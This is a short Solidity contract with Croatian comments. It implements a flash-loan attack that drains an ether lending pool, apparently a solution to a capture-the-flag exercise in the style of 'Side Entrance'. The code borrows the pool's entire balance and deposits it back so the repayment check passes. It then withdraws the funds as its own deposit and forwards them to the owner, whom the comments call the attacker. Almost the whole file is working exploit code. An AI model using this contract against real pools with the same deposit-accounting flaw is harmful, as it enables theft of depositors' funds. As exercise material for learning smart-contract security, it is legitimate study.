// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ILenderPool {
    function flashLoan(uint256 amount) external;
    function withdraw() external;
    function deposit() external payable;
}
//PLAN
//1. UZMI FLASH LOAN U IZNOSU CIJELOG POOLA
//2. DEPOSITAJ ZADANA SREDSTVA -> NA TAJ NACIN CE NAM SE UVECAT BALANCE ZA TAJ IZNOS A VRATIT CEMO POOLU ONO STA SMO UZELI -> UVJET require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back"); ĆE BIT ZADOVOLJEN
//3. WITHDRAWAMO NASA SREDSTVA -> TO SU ZAPRAVO SVA SREDSTVA POOLA JER JE TAKO ZAPISANO TIJEKOM DEPOSITA

contract FlashLoanEtherReceiver {
    address internal owner;
    constructor()
    {
        owner=msg.sender;
    }
    function execute() external payable{//etheri se PRILIKOM OVOG POZIVA upisuju na adresu contracta ne napadaca
        //MSG.SENDER JE POOL CONTRACT
        ILenderPool(msg.sender).deposit{value:msg.value}();//depositaj sve
    }

    function drainPool(address poolAddress,uint256 poolBalance) external {
        require(msg.sender==owner,"Only owner can call this function");
        ILenderPool(poolAddress).flashLoan(poolBalance);
        ILenderPool(poolAddress).withdraw();
    }

    receive() external payable {//za prihvat ethera iz withdraw funkcije gdje se šalju sa .sendValue() utlitiy funkcijom
        payable(owner).transfer(msg.value);//prenesi ih napadacu-> owneru
    }
}
